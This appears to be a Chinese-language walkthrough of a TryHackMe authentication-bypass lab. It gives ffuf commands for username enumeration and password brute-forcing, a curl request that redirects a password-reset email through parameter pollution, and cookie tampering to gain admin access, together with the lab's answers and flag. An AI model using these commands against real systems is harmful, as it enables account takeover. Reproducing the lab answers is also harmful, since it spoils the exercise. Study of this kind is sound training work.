# tsak1
```
no answer needed
```

# tsak2 
## 用戶名枚舉

網站錯誤消息是整理這些信息以構建我們的有效用戶名列表的重要資源。如果我們訪問 Acme IT 支持網站 ( http://10.10.116.236/customers/signup ) 註冊頁面，我們有一個創建新用戶帳戶的表單。



如果您嘗試輸入用戶名 admin 並使用虛假信息填寫其他表單字段，您將看到我們收到錯誤 An account with this username already exists。我們可以使用下面的 ffuf 工具，利用此錯誤消息的存在來生成已在系統上註冊的有效用戶名列表。ffuf 工具使用常用用戶名列表來檢查任何匹配項。
```
user@tryhackme$
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.116.236/customers/signup -mr "username already exists"
```

在上面的示例中，-w參數選擇文件在計算機上的位置，其中包含我們要檢查的用戶名列表是否存在。參數指定請求方法，-X默認為 GET 請求，但在我們的示例中為 POST 請求。-d參數指定我們要發送的數據。在我們的示例中，我們有字段用戶名、電子郵件、密碼和 cpassword。我們將用戶名的值設置為FUZZ。在 ffuf 工具中，FUZZ 關鍵字表示我們的詞表中的內容將被插入到請求中的什麼位置。該-H參數用於向請求添加額外的標頭。在這種情況下，我們將 設置Content-Type為網絡服務器知道我們正在發送表單數據。這-u參數指定我們向其發出請求的 URL，最後，-mr參數是我們正在尋找的頁面上的文本，以驗證我們是否找到了有效的用戶名。


命令的結果保存到名為 valid_usernames.txt 的文件中，我們可以在以後的任務中使用該文件


```
Q: 以 si*** 開頭的用戶名是什麼？
A: simon

Q: 以 st*** 開頭的用戶名是什麼？
A: steve

Q: 以 ro**** 開頭的用戶名是什麼？
A:robert
```
# tsak3
```
┌─[root@parrot]─[/home/user/Desktop]
└──╼ #vim valid_usernames.txt
┌─[root@parrot]─[/home/user/Desktop]
└──╼ #cat valid_usernames.txt 
simon
steve
robert
admin
```
因為我們使用了多個詞表，所以我們必須指定我們的自己的 FUZZ 關鍵字。在這種情況下，我們選擇W1了有效用戶名W2列表和我們將嘗試的密碼列表。多個詞表再次用-w參數指定，但用逗號分隔。對於肯定匹配，我們使用-fc參數來檢查 200 以外的 HTTP 狀態代碼。
```
 ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.116.236/customers/login -fc 200



----------------------------------------------
 [Status: 302, Size: 0, Words: 1, Lines: 1]
    * W1: steve
    * W2: thunder

```
```
什麼是有效的用戶名和密碼（格式：用戶名/密碼）？
steve/thunder
```
# tsak4

重置電子郵件過程的第二步中，用戶名在 POST 字段中提交到 Web 服務器，電子郵件地址在查詢字符串請求中作為 GET 字段發送。
```
 curl 'http://10.10.116.236/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```
使用該-H標誌向請求添加額外的標頭。在本例中，我們將設置Content-Type為application/x-www-form-urlencoded，這讓 Web 服務器知道我們正在發送表單數據，以便正確理解我們的請求。
在應用程序中，使用查詢字符串檢索用戶帳戶，但稍後，在應用程序邏輯中，使用 PHP 變量中的數據發送密碼重置電子郵件$_REQUEST。
```
PHP$_REQUEST變量是一個數組，其中包含從查詢字符串接收到的數據和 POST 數據。如果查詢字符串和 POST 數據使用相同的鍵名，則此變量的應用程序邏輯傾向於 POST 數據字段而不是查詢字符串，因此如果我們在 POST 表單中添加另一個參數，我們可以控制密碼重置的位置電子郵件送達。
```
------------------------------------------------------------
在電子郵件字段中使用您的@acmeitsupport.thm，您將在您的帳戶上創建一張票，其中包含一個鏈接，您可以以 Robert 的身份登錄。使用 Robert 的帳戶，您可以查看他們的支持票並顯示一個標誌
```
curl 'http://10.10.116.236/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=xiaocai@customer.acmeitsupport.thm'

讓他把重製的發給我的 xiaocai@customer.acmeitsupport.thm   
```

# tsak5
## Cookie Tampering
```
root@parrot]─[/home/user/Desktop]
└──╼ #curl http://10.10.116.236/cookie-test
Not Logged In


返回了一條消息：未登錄


[root@parrot]─[/home/user/Desktop]
└──╼ #curl -H "Cookie: logged_in=true; admin=false" http://10.10.116.236/cookie-test
Logged In As A User

將logged_in cookie設置為true，並將admin cookie設置為false：
收到消息：以用戶身份登錄

┌─[root@parrot]─[/home/user/Desktop]
└──╼ #curl -H "Cookie: logged_in=true; admin=true" http://10.10.116.236/cookie-test
Logged In As An Admin - THM{COOKIE_TAMPERING}

發送最後一個請求，將 logged_in 和 admin cookie 都設置為 true：
返回結果：以管理員身份登錄以及可用於回答問題一的標誌
```
